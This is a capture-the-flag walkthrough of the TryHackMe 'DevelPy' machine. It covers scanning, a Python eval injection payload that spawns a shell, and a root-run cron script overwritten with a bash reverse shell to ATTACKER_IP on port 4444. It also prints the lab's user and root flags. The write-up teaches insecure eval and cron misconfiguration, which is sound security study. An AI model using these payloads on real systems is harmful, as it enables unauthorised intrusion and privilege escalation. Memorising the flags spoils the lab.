# TryHackMe - DevelPy Walkthrough

## Challenge Information

| Category     | Value                                                                                        |
| ------------ | -------------------------------------------------------------------------------------------- |
| Platform     | TryHackMe                                                                                    |
| Machine Name | DevelPy                                                                                      |
| Difficulty   | Medium                                                                                       |
| Type         | Linux Boot2Root                                                                              |
| Objective    | Gain initial access through a vulnerable Python application and escalate privileges to root. |

---

# Introduction

Today we are solving another TryHackMe machine named **DevelPy**.

This is a Linux-based medium difficulty machine focused on identifying insecure Python code execution, obtaining a shell through Python command injection, and exploiting misconfigured cron jobs for privilege escalation.

---

# Enumeration

## Target Information

```text
Main IP :: 10.49.164.145
```

---

# Initial Port Scan

We begin with a full TCP port scan using Nmap.

```bash
nmap -p- 10.49.164.145
```

Output:

```text
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```

Only two ports are exposed:

* SSH (22)
* Custom service on port 10000

---

# Service Enumeration

Running version detection:

```bash
nmap -sCV -p22,10000 10.49.164.145
```

Results:

```text
22/tcp open ssh OpenSSH 7.2p2 Ubuntu
10000/tcp open unknown service
```

Interesting output from port 10000:

```text
Private 0days

Please enther number of exploits to send??:
```

Nmap also reveals Python traceback errors:

```text
File "./exploit.py", line 6

num_exploits = int(input(' Please enther number of exploits to send??: '))
```

The service appears to be written in Python and directly evaluates user input.

---

# Manual Enumeration

Testing with curl:

```bash
curl -I http://10.49.164.145:10000/
```

Result:

```text
curl: (1) Received HTTP/0.9 when not allowed
```

The service is not speaking normal HTTP.

---

# Interacting With Netcat

Connecting directly:

```bash
nc -vn 10.49.164.145 10000
```

Response:

```text
Private 0days

Please enther number of exploits to send??:
```

Supplying a normal integer:

```text
1
```

Response:

```text
Exploit started, attacking target (tryhackme.com)...

Exploiting tryhackme internal network:
beacons_seq=1
ttl=1337
time=0.098 ms
```

At this point it becomes clear that user input is likely being passed into Python functions without proper sanitization.

---

# Initial Access

After multiple failed attempts and receiving a hint, we exploit the vulnerable Python input handling.

Payload:

```python
__import__('os').system('bash')
```

Full interaction:

```bash
nc -vn 10.49.164.145 10000
```

```text
Private 0days

Please enther number of exploits to send??:

__import__('os').system('bash')
```

Success:

```text
bash: cannot set terminal process group
bash: no job control in this shell
```

We now have a shell.

---

# User Enumeration

Checking current user:

```bash
whoami
```

```text
king
```

Listing files:

```bash
ls
```

```text
credentials.png
exploit.py
root.sh
run.sh
user.txt
```

Reading user flag:

```bash
cat user.txt
```

```text
cf85ff769cfaaa721758949bf870b019
```

User access achieved.

---

# Privilege Escalation Enumeration

Checking cron jobs:

```bash
cat /etc/crontab
```

Interesting entries:

```text
* * * * * king    cd /home/king/ && bash run.sh

* * * * * root    cd /home/king/ && bash root.sh

* * * * * root    cd /root/company && bash run.sh
```

These entries reveal a major security issue.

Root executes:

```bash
/home/king/root.sh
```

every minute.

Since the file resides inside King's writable home directory, we can replace it with our own payload.

---

# Cron Job Abuse

First inspect existing file:

```bash
cat root.sh
```

Output:

```python
python /root/company/media/*.py
```

Remove the existing script:

```bash
rm -rf root.sh
```

Create a malicious replacement:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > root.sh
```

Example:

```bash
echo "bash -i >& /dev/tcp/192.168.138.6/4444 0>&1" > root.sh
```

Make it executable:

```bash
chmod +x root.sh
```

---

# Listener

Start a listener:

```bash
nc -lvnp 4444
```

Wait for cron to execute.

After roughly one minute:

```text
connect to [192.168.138.6] from [10.49.164.145]

bash: cannot set terminal process group
bash: no job control in this shell
```

Check privileges:

```bash
whoami
```

Output:

```text
root
```

Root shell achieved.

---

# Root Flag

Navigate to root directory:

```bash
cd /root
```

Read flag:

```bash
cat root.txt
```

Output:

```text
9c37646777a53910a347f387dce025ec
```

Machine rooted successfully.

---

# Attack Path Summary

```text
Port Scan
      ↓
Port 10000 Discovered
      ↓
Python Traceback Revealed
      ↓
Unsafe Input Handling Identified
      ↓
Python Command Injection
      ↓
Shell as king
      ↓
Cron Job Enumeration
      ↓
Root Executes Script From User Directory
      ↓
Overwrite root.sh
      ↓
Cron Executes Payload
      ↓
Root Shell
      ↓
Root Flag
```

---

# Key Findings

## Initial Access

* Python application directly evaluated user input.
* Command injection possible through Python built-in functions.
* Payload used:

```python
__import__('os').system('bash')
```

## Privilege Escalation

Misconfigured cron jobs allowed root to execute scripts stored in a user-controlled directory.

Root cron entry:

```bash
* * * * * root cd /home/king/ && bash root.sh
```

This provided a straightforward privilege escalation path by replacing the script with a reverse shell payload.

---

# Lessons Learned

### Secure Coding

Never evaluate user-controlled input directly.

Dangerous patterns include:

```python
eval()
exec()
input() + eval()
```

without validation.

### Cron Job Security

Root should never execute scripts from directories writable by unprivileged users.

### Principle of Least Privilege

Administrative scheduled tasks should reside in protected directories owned exclusively by root.

---

# Flags

## User Flag

```text
cf85ff769cfaaa721758949bf870b019
```

## Root Flag

```text
9c37646777a53910a347f387dce025ec
```

---

# Conclusion

DevelPy demonstrates how a single insecure Python application can lead directly to system compromise. The challenge begins with identifying unsafe Python code execution through traceback information exposed on a custom service. Exploiting this vulnerability grants access as the user **king**. Further enumeration reveals a critical cron misconfiguration where root repeatedly executes scripts from a user-writable directory, allowing straightforward privilege escalation and complete system compromise.
